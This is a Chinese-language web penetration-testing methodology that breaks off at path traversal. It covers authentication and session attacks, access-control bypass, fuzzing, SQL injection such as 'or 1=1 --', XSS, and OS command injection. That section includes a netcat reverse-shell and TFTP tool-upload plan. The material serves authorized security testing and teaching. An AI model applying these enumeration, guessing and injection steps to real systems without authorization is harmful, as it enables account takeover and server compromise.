返回的数据有时可能会经过模糊处理，此时不能直接修改它，因为直接修改会被服务端发现和拒绝，导致数据无效；需要先反编译 applet，得到其源代码，之后才能对数据进行修改； 在浏览器输入 URL，下载 applet 字节码，使用适当的工具对其进行反编译（有时下载的文件可能被压缩过，可使用解压工具进行解压，例如 WinRAR 或 WinZip）； Java 的 applet：可使用 Jad Flash：SWFScan、Flasm、Flare； Silverlight：.NET Reflector； 分析反编译后的源代码，了解其返回的数据是如何处理和计算出来的； 查看源代码中，是否包含对任意数据进行模糊处理的通用函数； 如果源代码中有对输入进行检查，可对其进行修改，让检查失效； 修改后，再使用编译工具，将源代码重新编译为原本的格式； 附加调试器如果客户端程序很大，反编译、阅读和修改其源代码的工作量很大，而且也很容易出错，一个抄小路的办法是使用调试器，追踪某个功能的执行过程，理解其处理逻辑，然后在合适的位置设置断点，修改相应的值，得到我们想要的最终预期结果即可。 JavaSnoop； Silverlight Spy； 测试 ActiveX 控件 找出所有使用 ActiveX 控件的地方。可从拦截的请求记录中查找 .cab 文件名，或者在 HTML 页面源代码中搜索 OBJECT 标签 同样可以使用调试器来修改和操纵 ActiveX 控件的返回值； 可使用 COMRaider 等工具枚举控件的各种方法。根据 ActiveX 控件的方法名称和参数，猜测其用途。检查是否能够操作这些方法，从而影响控件的行为，例如避开执行的输入确认机制； 如果控件的功能是收集检查客户端计算机的相关信息，则可以使用第三方工具（如 Filemon、Regmon 等）监控控件收集到的信息；然后通过修改客户端注册表中的值，或者创建相应的数据项，来影响控件的行为； 探查控件是否存在可用来攻击其他用户的漏洞；可修改 HTML 调用控件的源代码，修改参数，监控控件的处理结果； 查找控件有无存在危险的方法，例如搜索 LaunchExe 名称； 使用 COMRaider 对控件进行模糊测试，看是否存在缓冲区溢出漏洞； 测试验证机制 了解验证机制 了解应用程序使用的验证机制，如用户名密码表单、证书、多重验证； 了解所有与验证相关的功能，如登录、注册、忘记密码等； 如果应用程序不能自助注册，则尝试通过其他方法搞到几个账户； 测试密码强度 寻找应用程序中关于密码强度的最低要求； 在注册页面或密码修改页面，使用不同强度的密码，对实际的密码强度规则进行测试，例如短密码、纯数字密码、全小写或全大写密码、单词型密码、和用户名一致的密码等； 测试服务端密码验证机制：例如先设置一个足够长（如12个字符）且复杂的密码（包含大小写、数字和特殊符号），然后尝试使用这个密码的各种变化形式进行登录（例如删除最后一个字符、改变大小写、删除特殊字符等）；如果某种尝试取得成功，不要停下来，继续测，直到摸清服务端的整个密码验证机制； 了解清楚最低密码强度要求，以及服务端的密码验证机制后，使用这些信息来枚举可能有效的密码值，以提高攻击成功概率； 尝试枚举可能存在的内置账户，它们很可能并不满足最低密码强度要求； 用户名枚举 找出所有提交用户名的位置，例如可见字段、隐藏字段、cookie 等；（这些位置通常为登录、注册、修改密码、退出账户、激活账户等）； 在每一个提交用户名的位置，故意先提交一个有效用户名的请求，然后再提交一个无效用户名的请求，比如这两个请求之间的差异，以便后续用于筛查枚举出的有效用户名（这些差异可能发生在可见的 HTML 内容、状态码、不可见的 HTML 源代码中，有时则可从服务端的响应时间做出判断）；可以使用一些第三方工具（如 WebScarab）对返回的 HTML 内容进行自动比对，快速找出差异）； 当找到差异后，再提交一组或多组有效+无效的用户名进行重复测试，然后从差异中寻找规律； 尝试通过应用程序其他方面的漏洞（例如信息泄露、日志、注册用户列表、源代码注释等），获取尽可能多的有效用户名； 分析是否有可能利用一些使用用户名参数的功能，对有效用户名进行枚举，例如注册功能，当尝试输入一个已经存在的用户名时，会有提示； 失败次数上限 找出所有提交密码的位置（通常为注册页面、修改密码页面）；如果修改密码页面能够提交任意用户名，则该功能有可能用于猜测密码； 在每一个位置，先提交多组正确的用户名（受控账户）+ 错误密码的请求，监控应用程序的响应，找出响应之间的差异（如果经过10次登录失败后，账户还没有锁定，则可以再提交一个包含有效密码的请求，看是否能够顺利登录，如果可以的话，说明应用程序很可能并没有设置失败次数上限的账户锁定机制）； 如果没有受控账户，则只能通过枚举或猜测一个有效的用户名，然后使用这个用户名进行测试，看超过一定的失败次数后，是否会导致账户锁定（这个方法的缺点是会导致一些用户的账户被冻结锁定） 测试忘记密码功能 确定应用程序是否有忘记密码的功能（正常都有）； 使用一个正常的受控账户，完整整个忘记密码的流程，了解其工作机制（有些是发邮件，有些是询问问题、有些是发短信等）； 如果机制是询问答题，则确定这些问题是否由用户在注册时设定或选择的；如果是的话，可使用多个受控账户来收集这些问题，看里面是否有部分问题的答案较容易枚举猜测出来； 如果机制是密码暗示，使用跟上一步相同的步骤，收集密码暗示，看是否有容易猜到答案的暗示； 使用一个受控账户 + 多个错误答案进行测试，看是否会触发账户冻结；如果不会，则意味着可以使用枚举攻击； 如果机制是发送邮件，则使用受控账户接收多个邮件，分析邮件中收到的账户恢复 URL 是否存在规律，能否利用它猜测出发给其他用户的 URL；同时，确认是否有可能控制收件地址； 测试“记住我”功能 确定应用程序是否有“记住我”的功能，如果有的话，激活它，并分析它的工作原理； 有些“记住我”的功能可让用户再次登录时不需要输入密码，分析其工作原理； 检查该功能是否使用本地存储的 cookie，如果有的话，分析 cookie 是否包含用户的身份信息； 通常 cookie 会经过模糊处理，但可以通过多个非常相似的用户名，来分析模糊处理是否存在规律，如果有的话，就有机会进行逆向工程； 根据找到的规律，尝试修改 cookie 内容，看是否能够伪装成其他用户登录； 测试伪装功能 查找应用程序中是否存在伪装漏洞，即 A 用户可伪装成 B 用户并查看其数据； 从用户提交的数据中，查找是否有哪项数据可用于伪装身份，尝试修改这个数据，看能否伪装成其他用户，尤其是能够提升权限的管理员账户； 在实施密码猜测攻击的过程中，特别留意是否以下现象，即一个账户对应多个密码，或者多个密码对应相同账户；这个现象意味着开发人员很可能设置有后门密码，运营人员利用该后门密码可登录任意用户的账号； 测试用户名唯一性 如果应用程序提交自助注册的功能，并允许用户填写自己想要的用户名，则可以尝试使用不同的密码注册相同用户名，看应用程序是否会报错，如果会的话，有可能可以利用该报错功能，来枚举有效的用户名； 注册相同用户名时，如果应用程序没有报错，就有意思了。此时可将 A 账号的密码，修改成与 B 账号一样，然后进行登录，观察应用程序的反应；之后，再尝试使用相同的账号和密码进行注册，观察应用程序的反应；（有些应用程序，可能使用账号+密码的组合，作为用户身份的标识）； 如果两个账号的用户名和密码发生冲突时，应用程序会报错，则可以利用该功能来猜测其他用户的密码；先枚举有效的用户名，再枚举密码进行注册。当某个组合出现报错时，则说明该用户名 + 密码可能已经被注册过了； 如果两个冲突的账号+密码也不会报错，则进行登录，看两个账号的身份是否会互窜，使得 A 账号可以访问 B 账号的数据； 测试密码可预测性 如果用户名和密码是由应用程序自动生成的，则找出名称上相连的账号和它们的密码，观察这些密码之间存在规律； 如果用户名的生成是有规律的，则往后推，枚举一组很可能有效的用户名，使用这些用户名来猜测密码； 如果密码的生成是有规律的，则可以使用该规律往前推，枚举可能有效的密码，然后和已经收集的有效用户名进行组合，实施猜测攻击； 检测不安全的密码传输 遍历所有需要传输密码的位置，例如注册、登录、密码修改、查看和更新个人信息等功能； 配置代理服务器的拦截功能，对特殊字符进行标记，以便让拦截器找出在哪些位置传输密码； 如果在 URL 参数中传输，则密码很可能会在浏览器历史记录、屏幕、服务器日志，以及 Referer 消息头（当访问第三方链接时）中泄露； 如果密码保存在 cookie 中，则可通过 XSS 攻击或本地隐私攻击获得； 如果密码从服务端传送回客户端，则攻击者有可能通过会话管理漏洞、访问控制漏洞、XSS 漏洞等方式获得证书； 如果密码在传输过程中没有加密，则可能被传输过程中的窃听者获取； 如果使用 HTTPS 传输，但是使用 HTTP 加载表单，则存在中间人攻击漏洞，攻击者可以利用该漏洞获得密码； 检测不安全的密码分配 有些应用程序可能使用某种第三方渠道来创建账号或分配初始密码，例如通过发送电子邮件，或者寄送信件等； 如果应用程序使用 URL 来激活账号，则可以尝试连续注册几个账号，然后分析收到的 URL，看是否存在生成规律； 如果有规律，尝试预测应用程序最近生成的 URL，尝试使用这些 URL 来激活最近注册的用户账号； 尝试重复访问激活 URL，看应用程序如何反应；如果会被拒绝，则在重复访问 URL 之前，先冻结账号，然后看这个 URL 能否使用； 尝试看能否通过激活 URL 为账号设置新密码； 测试不安全的密码散列 如果获取到了大量的散列密码，通常这些密码共用某个散列值。此时，可尝试使用最常见的密码进行登录，如果可以登录成功，那么跟散列密码中出现频次最高的密码，很可能可以对应得上； 使用离线的第三方散列算法工具（例如彩虹表）破解明文值; 测试逻辑缺陷测试故障开放条件 罗列出所有应用程序要求客户端提交用户凭据的功能（例如登录、修改密码等）； 使用受控账户访问以上功能，记录所有请求参数； 重复访问这些功能，但是轮流对参数进行修改，以测试应用程序的代码逻辑，这些修改包括： 提交空字符串； 删除键值对； 提交非常长的值； 提交非常短的值； 字符串代替数字； 数字代替字符串； 以相同的值，多次提交同一个命名参数； 以不同的值，多次提交同一个命名参数； 仔细检查服务端返回的响应，如果发现异常，进一步测试； 基于异常，添加其他异常参数组合，进一步测试和扩大逻辑缺陷； 测试多阶段处理机制 如果应用程序的验证功能涉及多个请求，并在不同的请求中提交凭证，则尝试确定每个请求，并记录每个请求所使用的参数； 重复访问这些功能，修改提交请求的顺序，测试应用程序的处理逻辑，测试方法包括： 以不同的顺序完成所有阶段，到达目标阶段； 轮流直接进入每一个阶段，然后正常完成后续的阶段； 重复访问功能，轮流省略其他的每一个阶段，然后正常访问后续的阶段； 根据响应结果，进一步有针对性的修改访问顺序，测试和扩大应用程序潜在的逻辑缺陷； 查看是否有某些信息，在各个阶段都重复提交（有可能是由用户主动提交，也有可能是隐藏在表单、cookie、或预设的 URL 查询字符串中）；尝试在不同的阶提交不同的值（有效的，无效的），观察应用程序的响应，看提交的参数是否是多余的，或者在某个阶段确认后，后续应用程序就自动信任它，还是在不同的阶段都会检查；尝试利用多阶段漏洞获得未授权的访问，或者降低多阶段机制所要达到的预期控制目标； 仔细查看客户端发送的请求中的所有参数，有可能应用程序使用这些参数跟踪状态，尝试这些参数，破坏应用程序的逻辑； 有些应用程序会在每个阶段中添加一个随机质询，如有，则可对其进行测试： 如果质询参数跟用户的其他参数一起提交，则尝试能否改质询的键值，选择自己的质询； 使用相同的用户名，重复访问同一个阶段，但质询是否会不断变化，如果会的话，可以重复访问这个阶段，直到出现自己想要的质询； 枚举密码 分析所有在应用程序中找到的漏洞，从中筛选出可利用来实现预期目标的漏洞，例如实现用另外一名用户的身份进行登录；如有可能，最好能实现以管理员的身份进行登录； 在实施攻击之前，应该将应用程序的防御机制纳入考虑，提交攻击效率；例如在枚举用户名时，不要选择随机密码，而是使用最常用的密码，这样有一定概率会命中密码，不至于每个枚举的用户名，全部使用掉一次错误机会。使用广度优先，而不是尝试优先的方法来枚举，并且依次使用最常用的密码，避免同一个账户短时间内太多失败请求，导致账户被冻结； 猜测密码时，应该将密码强度规则和长度规则纳入考虑，提前筛查掉不满足强度要求或长度规则的密码； 使用自动化工具来提交枚举攻击效率； 测试会话管理机制 了解会话管理机制 了解应用程序是如何管理会话状态的。例如是否在每次的请求中使用令牌来标记用户的身份；有些应用程序可能没有使用令牌，而是使用一个加密或模糊处理过的表单来保存用户状态信息（相当于将状态保存在客户端，服务端是无状态的），或者使用 HTTP Authentication 技术来维持状态（它的原理很简单，就是浏览器将用户名和密码等信息保存下来，如果某个 URI 需要验证，浏览器就自动发出凭据，用户无感知）； 如果应用程序使用令牌的话，因为令牌可有多种渠道传送，例如 cookie、查询字符串、隐藏表单、消息体等；因此，可对它们逐个进行排查，看到底是哪个；有时候可能多个渠道同时使用，但实际上不同渠道的值，由不同的后端组件处理。有些看起来很像是令牌的数据，其实并没有用，例如负载均衡亲和性功能所提供的令牌； 找一个必须依赖令牌的页面，例如显示用户个人令牌的页面，然后依次删除请求疑似令牌的参数，看返回的响应是否正常；当出现异常时，即可确认该参数应该是会话令牌； 有些应用程序并没有使用令牌中的完整令牌，而只使用了部分令牌，因此，在找到令牌后，可轮流修改一个字节的值，然后发送请求，看应用程序能否正常返回响应；如果有部分值并未用于确认用户身份，则可以忽略它们； 测试令牌的含义 收集令牌：在不同的时间，以不同的账号，登录应用程序，收集应用程序发布的令牌；如果应用程序能够自助注册，则用多个名称相近的账号注册（名称只有一个字符的差别，相同长度不同字符，或者相同字符不同长度）；如果注册时还需要提供额外的身份信息，例如电子邮件，则该信息说不定也会参与到令牌的生成中，因此，也可以对该字段进行系统修改（每两个邮件之间只相关一个字符）； 分析收集到的所有令牌，观察其中是否包含与用户名或者其他用户身份相关数据（如电子邮件）有关的内容； 观察令牌是否使用某种明显的编码或者模糊方案； 观察用户名长度与令牌长度是否有关，如果相关，则说明很可能使用了模糊处理或某种编码机制； 如果用户名包含相同的字符，则观察令牌中是否包含使用 XOR 异或运算结果的相应序列； 观察令牌是否仅包含十六进制序列，如果是，则说明可能经过了十六进制的编码处理； 观察令牌是否包含等号，以及仅包含 base64 字符集； 如果从令牌中可以观察到规律，则测试是否可以利用这些规律发动攻击，例如利用规律猜测用户程序发给最近用户登录的令牌，然后尝试利用该令牌登录某个依赖令牌的页面，看能否成功； 测试令牌的可预测性 快速重复访问某个可返回新令牌的请求，以大量获取连续生成的会话令牌； 观察这些令牌样本，尝试从中寻找规律；此时可使用工具如 Burp Sequencer 来对令牌的随机性进行统计测试；一些注意事项如下： 令牌中可能部分数据不参与用户身份确认，因此可以忽略它们，只关注那些参与身份验证的内容； 如果看不贴出来令牌数据的类型，则可以尝试多种编码方案（例如 Bases64 ）对其进行解码，看能否转化成更有意义的数据（有时可考虑多种编码方案的组合）； 分析解码后的令牌是否存在规律，计算每两个连续值之间的差；有可能令牌表面看起来没有规律，但是从差值入手，就可以发现规律；这种差值规范可用于提高蛮力攻击的效率； 等待几分钟后，再使用前面的方法重新获取一遍令牌，以观察令牌的生成是否跟时间因素有关； 如果已经找出了一定的规律，再使用一个不同的 IP 地址获取另外一组令牌样本，检查规律是否仍然存在（排查令牌的生成与 IP 地址有关）；以及看能否使用第一组令牌，推导出第二组令牌； 如果已经找到规律和时间依赖关系，则检查是否可以利用该规律，猜测最近发布的新令牌，尝试使用新令牌登录； 另外可以使用 Burp Intruder 工具，对令牌中的每个位进行翻转修改，看是否会造成令牌失效，或者变成另外一名用户的身份； 检查不安全的令牌传输 以正常方式依次访问应用程序，从主页开始，到登录，到访问其他所有功能。记录所有发布令牌的位置，并留意哪些部分使用 HTTP 通信，哪些使用 HTTPS 通信（可通过拦截器的日志观察到这些信息）； 如果应用程序使用 cookie 字段传送信息，则观察 cookie 值，看是否启用了 httpOnly 和 Secure 选项； 如果令牌是通过 HTTP 传送的话，则令牌很容易被拦截； 如果应用程序未登录前使用 HTTP，在登录后使用 HTTPS，则留意登录后是否发布了新令牌，如果没有发布新令牌，仍然使用旧令牌，则旧令牌在 HTTP 阶段就已经可以被拦截了； 如果进入了 HTTPS 访问的页面后，页面上存在 HTTP 链接，则可以尝试访问它们，观察此时提交的令牌是否仍然有效，还是会被服务端终止； 检查日志中泄露的令牌 如果在解析应用程序过程中，发现应用程序有日志、管理、监控等功能，那么留意这些功能是否泄露会话令牌；检查访问这些功能的权限。如果只有管理员能够访问，低权限用户访问不到，则看有没有其他漏洞可加以利用，来协助访问这些功能； 有时候，某些特殊的原因，会导致开发者会在 URL 中传送令牌；此时如果用户访问站外链接，会导致在 Referer 消息头中泄露令牌；因此，特别留意是否有某个页面，可以被任意其他用户查看访问，同时用户可以在该页面插入任意的站外链接，例如个人自我介绍页面； 如果能够收集到大量的其他用户令牌，则对它们进行排查，看里面是否有某个令牌刚好属于管理员； 测试令牌会话映射 用同一个账号，在不同的浏览器或不同的电脑登录应用程序，看登录后的两个会话是否同时有效，如果是的话，说明应用程序支持并行会话。这将使得攻击者即使使用其他用户的身份登录，也不会被检测出来； 用同一个账号，在不同的浏览器或不同的电脑登录并退出应用程序，然后查看是否会发布新令牌，还是仍然有原来的旧令牌；如果旧令牌仍然有效，则开发者对会话的使用有错误，在用户退出后，没有及时终止会话。而是使用持久性的某个字符串来代表用户身份，非常危险； 如果令牌的内容包含某种特定的结构和意义，设法将有意义的部分和无意义的部分标识出来；尝试修改其他跟用户身份有关的部分，让其指向其他用户，然后用修改后的令牌登录，看是否有效； 测试会话终止 检查应用程序是否会执行会话终止 登录，获得令牌 等待一段时间，用该令牌访问受保护页面（如个人资料页）； 如果页面正常显示，说明令牌依然有效； 重复上述步骤，了解令牌的有效期 ； 如果一个令牌在连续提交请求的很长一段时间内（如几天），都一直有效，有可能它的有效期是按照最后一次请求来计算的，此时可配置 Burp Intruder 之类的工具递增每次请求之间的间隔。例如每次的间隔，都是上一次的2 倍； 检查退出功能是否真正起作用；登录，退出，使用令牌再次访问受保护页面，如果访问成功，则说明服务端在用户退出后，并没有真正关闭会话； 测试会话固定 没有登录的用户也会得到令牌，并且在登录后，令牌不变，则存在会话固定漏洞； 如果登录后才发布令牌，再次访问登录页面，用另外一个账号登录，如果此时应用程序没有发布新令牌，则也同样存在会话固定漏洞； 观察令牌的格式，尝试使用一个符合格式，但值是虚构的令牌进行登录。如果可以登录成功，则说明有会话固定漏洞； 如果应用程序有发布令牌，但没有登录功能。在显示某些敏感数据时，会使用令牌，则可能存在会话固定漏洞。可用前三种方法，尝试访问敏感数据； 检查 CSRF 如果应用程序完全依靠 HTTP cookie 来传送令牌，则它有可能容易受到 CSRF 攻击； 分析应用程序的关键功能，查看执行这些功能的请求，其参数能否由攻击者完全自行设定，例如参数中不包含任何用于验证身份的令牌，如令牌、随机数或者密码等；那么这些功能有很大的漏洞，可被攻击者轻易利用； 攻击者可以创建一个 HTML 页面，在无须用户执行任何动作的情况，自动将请求发送出去； GET 请求：将目标 URL 放在 标签中即可； POST 请求：做一个表单，参数默认址设置好。并 JS 代码监听页面加载事件，加载时，触发发送该表单； 如果应用程序为了防御 CSRF 攻击，要求在请求中提交令牌，则可以使用测试会话令牌的办法，对页面上的令牌进行可靠性测试；并测试应用程序是否存在 UI 伪造漏洞，如果有的话，也可用于突然 CSRF 防御； 检查 cookie 作用域 如果应用程序使用 cookie 来传送令牌，则检查 cookie 的相关属性，例如其作用域、路径等； 如果 cookie 的使用范围很宽泛，例如指向根目录。那么攻击者有可能利用服务端使用相同根目录的其他应用程序发布的 cookie 来访问，即用 A 程序发布的 cookie，来访问 B 程序。两个程序共享 cookie 根目录； 如果应用程序以它自己的域名作为 cookie 的有效范围，但如果它的子域上面存在其他应用程序的话，也同样存在上一步中的相同问题（当然，有可能它的子域上面，并没有运行任何其他程序）； 找出那些使用路径进行隔离的场景，利用跨站点脚本破坏这种隔离； 找出所有应用程序发布的 cookie 的域名和对应的路径，从这些域名和路径中，排查是否存在其他应用程序，并确定是否可以使用相同的 cookie 访问它们；以及反过来，是否可以利用它们获得 cookie，访问目标应用程序； 测试访问控制 了解访问控制要求 根据应用程序的功能，分析其访问控制机制 垂直隔离：访问不同的功能，需要不同的权限； 水平隔离：相同功能，访问不同的数据，需要不同的权限；例如普通用户只能看自己的数据，管理员可以查看所有用户的数据； 根据应用程序解析结果，找出那些最有可能用来实施权限提升攻击的功能区域与数据资源类型； 为了提高测试效率，最好先获得大量不同垂直权限和水平权限的账号；如果应用程序允许自助注册，那么获得大量水平权限账号是很容易的。至于不同垂直权限的账号，有可能也允许自助注册。如果不行，则需要利用某个漏洞，来访问某个高权限账号；或者直接联系应用程序所有者，让其帮忙开通账号进行测试； 使用多个账号测试 如果存在垂直权限隔离，那么先使用高权限账号，访问整个应用程序，确定它能够访问的所有功能；然后，再使用一个低权限账号，访问上述所有功能，看哪些功能被隔离了。具体办法如下： 使用高权限账号登录，开启 Burp 工具，监听流量，生成站点地图； 检查站点地图是否完整，已包含待测试功能； 退出高权限账号，使用低权限账号登录； 使用比较站点地图的功能，看低权限用户是否能够访问原高权限账号访问过的那些功能； 如果存在水平隔离，则使用两个拥有相同垂直权限的不同账号，尝试用 A 账号访问 B 账号的数据；一般通过修改请求中的标识符来指定访问其他用户的资源； 手动关键的访问控制：检查每个用户权限下可访问的资源，然后使用未授权的账号，尝试对这些资源发起请求； 在测试访问控制时，特别注意多阶段功能，对每个阶段分别进行测试。看应用程序是否假设当前阶段的请求，已经通过了上个阶段的测试； 使用有限的权限测试 如果没有拥有多个不同垂直权限和水平权限的账号，则测试访问控制漏难度很大，因为不知道所有资源的 URL、标识符、参数等重要信息，导致很多漏洞难以发现； 假设测试员只能使用低权限账号进行测试，在解析应用程序的过程中，有可能会找到访问高级功能的 URL（如管理功能），如有的话，可尝试利用其中的漏洞提高账号的权限； 大多数受到水平隔离的资源，会使用某个标识符来对数据进行访问。因此，可以尝试生成一系列紧密相连的标识，识别标识符之中是否存在规律，用找到的规律来猜测其他标识符； 使用自动化工具，使用枚举出的标识符发起资源请求，看能否成功； 测试不安全的访问控制方法 有些应用程序很搞笑，通过客户端传输的参数来控制权限，例如 edit=false、access=read 等；如果发现这类型的参数的话，可尝试修改它们，看服务端如何反应； 有些应用程序使用 Rerefer 字段来控制权限，仅当 Referer 字段的值指向某个特定来源的时候（例如管理员才能访问的 URL），才允许访问当前资源；在访问特权页面时，留意 Referer 消息头的值，并尝试修改这个值，看是否会导致访问失败，如果会的话，说明应用程序很可能基于该字段控制权限； 如果应用程序允许使用 HEAD 方法，说明服务端可能使用某种容器托管方案，可进一步测试是否存在托管漏洞； 测试基于输入的漏洞很多重要的漏洞，都源于未对输入进行严格检查造成的，这种漏洞可出现在应用程序的任意位置；通过一组预生成的有效攻击荷载，轮流对请求中的每个参数进行测试，是探查这类漏洞的通用方法； 模糊测试所有请求参数 找出所有传递参数的位置，通常这些位置包括：查询字符串、消息主体、消息头（如Referer、User-Agent、Cookie 等）； 使用自定义脚本或者第三方工具，轮流对每一个参数进行单独的测试；在 Burp 套件中，可将拦截到的请求发送到 Intruder 模块进行处理即可； 配置一组有效的攻击荷载（可选择一个预告设定的列表，或者加载外部文件）；如果对每个参数都发送所有攻击荷载，显示不是效率最高的做法，可针对那些最常见的漏洞优先安排测试，这些常见漏洞包括： SQL 注入： XSS 与消息头注入： 命令注入： 路径遍历： 脚本注入： 文件包含： 为了便于理解，上一步截图中的有效攻击荷载都是以字面量显示，实际中，由于有些字符属于 HTTP 规范的关键字，因此在使用的时候，需要对它们进行 URL 编码；通常情况下，Intruder 工具会对它们进行编码（除非该选项被禁用了） 除了发送模糊请求外，还需要配置一些异常关键字和模糊参数本身（例如 Intruder 中的 Grep 功能），用来识别预示漏洞可能存在的响应，例如： 另外文件包含漏洞需要搭建一个 Web 服务并监控收到的请求，以便当漏洞存在时，应用程序可向该 Web 服务发送请求； 手工检查筛选出的所有异常响应，包括 HTTP 状态码、响应长度、响应时间、响应内容等； 根据异常内容，分析其可能存在的漏洞，对漏洞位置再次进行确认，并思考如何利用这些漏洞； 一旦配置完毕，完成对某个请求的模糊测试后，接下来对其他请求进行测试就可以开始快速自动化了； 如果在解析应用程序的过程中，发现应用程序使用某种带外通道来传输可由用户控制的数据，也不要遗漏利用这些通道提交测试请求；为了让测试更高效，可自定义测试脚本； 除了手动测试外，还可以运行自动化的扫描器，并比较手工和自动两份结果，兼听则明； 测试 SQL 注入在模糊测试过程中，如果发现某个位置可能存在 SQL 注入漏洞，则可进一步手工详细探查； 分析错误消息的语义（常用数据库软件的语义可参数第 9 章）； 当在模糊测试过程中提交一个单引号触发异常时，可在请求中提交两个单引号形成配对，看异常是否会消失；如果会的话，则说明漏洞很可能存在； 使用 SQL 连接符构建一个良性输入，然后观察它的响应是否跟未使用连接符的情况相同；如果会的话，说明漏洞可能存在（记得对字符器进行 URL 编码）； 如果正常的参数中包含数字，则可以使用表达式来替代数字，表达式的计算结果跟原值相同；如果响应程序能够正常响应，则说明漏洞很可能存在； 如果前面的步骤发现潜在漏洞后，可尝试提交针对 SQL 设计的数学表达式，构造一个特殊的值，来进一步确定漏洞。如果请求能够成功，则可以几乎肯定漏洞存在。表达式示例：，两个表达式的结果都为 2； 如果在请求参数中使用 waitFor 命令可以造成响应的明显延迟，则说明后端数据为 MS-SQL，且漏洞可能存在；可手动设置 waitFor 为不同大小的值，看是否响应时间会出现对应的变化。（可以同时在多个 SQL 查询中插入 waitFor，理论上响应时间会呈现为预置值的固定倍数）； 如果应用程序存在 SQL 注入漏洞，则应考虑这个漏洞可以用来做点什么其他的，例如： 通过修改 WHERE 子句中的条件，改变应用程序的逻辑（例如通过 or 1=1 -- 来避开登录限制）； 通过 UNION 操作符注入 SELECT 查询，将查询结果跟原始查询结果组合在一起； 通过 SQL 指纹语法来探测后端的数据库类型； 如果是 MS-SQL 数据库，并且应用程序会在响应中返回 ODBC 错误消息，则可以利用错误消息，获取任意的数据； 如果上一步行不通，可以尝试以下技巧来提取数据： 获取字符串数据的数字格式，一次提取一个字节； 使用带外通道； 如果可以根据条件判断获取不同的响应，则可以通过 abcinthe 一次一比特的提取数据； 如果可以根据条件触发延迟，则可以用延迟与否来提取数据，也是一次一比特； 如果应用程序对某些字符串和表达式实施过滤，尝试第9章的技巧避开过滤； 如有可能，利用漏洞以及功能强大的数据库函数，将攻击范围扩大到数据库和基础服务器； 测试 XSS 和其他响应注入确定反射位置 基于模糊测试得到的结果，先进行分类（例如 Burp 中可使用 “有效载荷 grep“ 来分类），然后查看哪些位置原样返回了 XSS 测试字符串； 查看字符串的位置 如果出现在响应主体中，可测试 XSS 漏洞； 如果出现在 HTTP 消息头中，可测试消息头注入漏洞； 如果出现在 302 响应的 Location 字段中，可测试重定向漏洞； 同一个请求参数，可能出现在多个位置，表明应用程序有可能同时存在多种漏洞； 测试主体注入 当请求参数值反射在响应主体中时，观察反射位置周围的 HTML 写法，思考如何针对性的设计相应的注入内容，以便可以执行任意的 JS 脚本，例如可通过注入 script 标签 + JS代码来实现，也可以注入到 HTML 标签属性值； 尝试向应用程序提交各种可能的内容，并监控它的响应，看应用程序是否采用某种过滤和净化机制； 如果发现有过滤机制，则在设计注入内容时，可参考第12章提到的各种技巧，避开这些检查，让浏览器能够执行预期的脚本； 如果 XSS 漏洞是 POST 类型，一种利用方法是建立第三方恶意站点，诱使用户发出 POST 请求； 测试消息头注入 如果反射出现在响应的报头部分，则尝试在参数中发送经过 URL 编码的回车和换行符，看它们是否能够在响应中返回（返回后的符号应不再是 URL 编码，而是已经解码）； 如果在返回的响应中发现新增了一行，则说明漏洞很可能存在；可根据第 13 章的技巧进行攻击； 如果在请求中发送两个换行符，但在响应中只返回一个，则可以根据情况尝试设计利用漏洞的办法； 如果应用程序实施某种过滤机制，则可以考虑通过以下技巧来规避： 测试任意重定向 如果反射出现在重定向内容中，则可以尝试利用漏洞，将重定向指向某个专门设计的钓鱼网站，提升网站的可信度； 如果请求参数发送的是绝对 URL，则尝试修改该 URL 中的域名，看是否会重定向到指定的域； 如果请求参数发送的是相对 URL，则尝试将其修改为绝对 URL，看是否会重定向到指定的域； 如果应用程序为了防御重定向漏洞，实施一定的过滤机制，则可尝试使用第 13 章的技巧来规避过滤； 测试保存型攻击 很多应用程序都有保存用户输入的功能，并在之后的某个功能中返回保存的数据。如果在模糊测试过滤中，发现响应中出现了匹配字符串（这些字符串不一定是在当前请求中提交的），则可以尝试找一下初始是哪个请求发送的数据； 有时候需要完成多阶段步骤，数据才能保存成功。此时可尝试手动完成所有步骤，然后检查数据是否保存成功并返回； 如果应用程序有垂直权限控制，则可以尝试登录高权限的账号，然后看其是否能够使用某个功能去查看低权限账号的数据。如果可以并存在保存型漏洞的话，那么这个漏洞很可能可以用来提升低权限账号的权限； 查找所有保存用户提交的数据的情况，并测试其是否也包含 XSS 漏洞和其他响应注入漏洞； 如果某个用户提交的数据，可以被其他用户查看，则漏洞可能被用来实施会话劫持攻击或者请求伪造攻击； 如果某个用户提交的数据，仅自己可以查看，则可以尝试配合其他漏洞，修改其他用户的数据，让其包含恶意脚本； 如果应用程序支持文件的上传和下载，则可以进一步分析是否允许上传 HTML、JAR或者文本文件，并且没有过滤其中包含的内容，那么很大概率存在漏洞。 如果应用程序允许上传 JPEG 图片，但没有检测是否包含有效的内容，则可用来实施针对 IE 用户的攻击； 注意测试应用程序如何对不同类型的文件做出处理，以及浏览器如何处理包含 HTML 而非正常内容，以便有针对性的设计内容，实现预期的目的； 如果应用程序对保存型 XSS 漏洞实施过滤机制，则分析这种过滤机制是否导致其出现本站点请求伪造的漏洞； 测试 OS 命令注入 当发送有效的命令注入攻击荷载后，如果应用程序的响应时间出现延迟，则可以进一步手动测试，修改参数值，看响应时间是否会随着参数值的变化而变化； 针对找到每一个可注入命令的攻击字符串，尝试将其修改为更加有用的命令（例如 ls、dir 等），然后检查命令的结果能否返回到浏览器； 如果可以就最好，如果不行，则可以尝试以下办法： 尝试建立带外通道：例如通过 TFTP 上传一些工具到服务器，然后使用 telnet 或者 netcat 和本地主机建立一个反向 shell，也可使用 mail 命令通过 SMTP 机制发送命令结果； 可以尝试将结果的内容输出到 Web 根目录下的某个文件，然后使用浏览器访问它们； 当找到命令注入办法并能够获得命令结果后，下一步是确定权限（例如使用 whoami 命令，或者向一个受保护的目录写入一个文件）； 如果权限很高就最好，如果比较低，就尝试设法提升自己权限，以便可以访问应用程序的所有敏感数据，或者通过被攻破的主机，访问同一网络中的其他主机； 如果已经确定请求中的参数会被提交给某个 OS 命令，但发送的攻击字符串无法攻击成功，则可以尝试使用 > 和 < 两个符号，将某个文件作为命令的输入，或者作为命令的输出；通过这种方法，可以读取和写入任意内容到文件中； 如果能够猜到应用程序执行的命令名称，则可以尝试在请求中携带该命令支持的选项，以便更好的利用命令； 如果发现应用程序针对注入实施过滤防御，则可以尝试在提交的字符串中插入转义字符，看应用程序是否会对转义字符进行转义，如果不会的话，就可以利用这个漏洞避开过滤机制； 如果发现空白符号被过滤，可以尝试使用 $IFS 来替代 UNIX 系列操作系统中的空格； 测试路径遍历 